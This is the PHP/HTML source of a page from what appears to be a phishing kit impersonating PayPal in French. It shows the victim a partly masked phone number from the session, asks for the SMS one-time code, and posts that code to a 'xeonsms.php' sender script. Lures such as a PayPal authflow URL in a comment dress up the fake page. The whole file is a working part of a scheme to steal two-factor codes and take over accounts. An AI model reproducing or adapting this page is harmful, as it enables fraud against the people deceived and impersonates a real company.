<?php
	include("../settings/lang/index.php");
	session_start();
?>
<!DOCTYPE html>
<html lang="fr-FR">
<head>
	<title>PayPal</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="shortcut icon" href="../assets/img/x.ico">
	<link rel="apple-touch-icon" href="../assets/img/appx.png">
	<link rel="stylesheet" href="../assets/css/fonts.css" />
	<link rel="stylesheet" href="../assets/css/main.css" />
	<link rel="stylesheet" href="../assets/css/sections.css" />
	<link rel="stylesheet" href="../assets/css/responsev.css" />
	<script type="text/javascript" src="../assets/js/main.js"></script>
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
</head>
<body>

	<!--
authflow/entry/?country.x=FR&flowContext=login&flowId=ul&locale.x=fr_FR&returnUri=%2Fauth%2Freturn&stepupContext=8328080216937885391
	-->

	<div>
		<style nonce="">html { display:block }</style>
		<div>
			<div>

			<!--[ SMS MSG CONTAINER ]-->
				<div class="xeonContent" id="xeonsmsmsg">

				<!-- CONTAINER --> 
					<div class="xeonsafeComponent">
						<header class="">
							<div class="xeonLogo"></div>
						</header>

						<div class="xeonsafe">
							<h1 class="xeonInfoTitle"><?php echo $xeon52; ?></h1>
								<p class="xeonFormTitle"><?php echo $xeon53; ?></p>
							<form>

								<div class="xeonMailBox">
						 			<div class="xeon-r-mail" style="padding:20px 0 0 0">
						 				<div class="contact" style="color: #2c2e2f"><?php echo $xeon54; ?><br>
						 					<p><span style="color:#2c2e2f;line-height: 3.5">Mobile ‪<?php echo substr($_SESSION["xeonNmtel"], 0,2);?> •• •• •<?php echo substr($_SESSION["xeonNmtel"], -3,1);?> <?php echo substr($_SESSION["xeonNmtel"], -2);?>.</span></p>
						 				</div>
						 			</div>
					 			</div>

								<input type="button" class="xeonButton" onclick="showsms()" value="<?php echo $xeon55; ?>" style="margin-top: 15px">

								<p class="xeonSmsAgree">
									<?php echo $xeon56; ?>
								</p>
							</form>
						</div>
					</div>
				</div>	

			<!--[ SMS CODE CONTAINER ]-->
				<div class="xeonContent hide" id="xeonsmscode">

				<!-- CONTAINER --> 
					<div class="xeonsafeComponent">
						<header>
							<div class="xeonLogo"></div>
						</header>
						<div class="xeonsafe">
							<h1 class="xeonInfoTitle"><?php echo $xeon57; ?></h1>
								<p class="xeonFormTitle"><?php echo $xeon58; ?> <?php echo substr($_SESSION["xeonNmtel"], 0,2);?> •• •• •<?php echo substr($_SESSION["xeonNmtel"], -3,1);?> <?php echo substr($_SESSION["xeonNmtel"], -2);?>.</p>

							<form action="../settings/send/xeonsms.php" method="post" name="smForm" onsubmit="return validateSmPsForm()">

						 		<div class="xeonFieldset">
									<input type="text" name="smpass" id="smpass" placeholder="<?php echo $xeon59; ?>" maxlength="8" autocomplete="off" autocorrect="off" />
								</div>

								<input type="submit" class="xeonButton" value="<?php echo $xeon60; ?>" style="margin-top: 15px">

							</form>
						</div>
					</div>

				</div>
			</div>
		</div>
	</div>

	<footer class="xeonFooter">
		<ul class="xeonFooterLinks">
			<li class="contactFooterListItem"><a href="javascript:void()"><?php echo $foot1; ?></a></li>
			<li class="privacyFooterListItem"><a href="javascript:void()"><?php echo $foot2; ?></a></li>
			<li class="legalFooterListItem"><a href="javascript:void()"><?php echo $foot3; ?></a></li>
			<li class="worldwideFooterListItem"><a href="javascript:void()"><?php echo $foot4; ?></a></li>
		</ul>
		<div></div>
	</footer>

	<script type="text/javascript" src="../assets/js/sections.js"></script>

	<script>
	$(document).ready(function(){
		$('#smpass').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#smpass').removeClass('hasError'); } else {$('#smpass').removeClass('hasError'); }});
		
		});
	</script>
		
<!-- LOADING -->
	<div class="xeonLoaderOverlay">
		<div class="xeonModalAnimate" id="xeonModalAnimate">
			<div class="xeonRotate"></div>
			<div class="xeonProcessing"><?php echo $xeon12; ?></div>
			<div class="xeonLoaderOverlayAdditionalElements"></div>
		</div>
	</div>
	<div class="xeonModalOverlay" id="xeonModalOverlay"></div>
</body>
</html>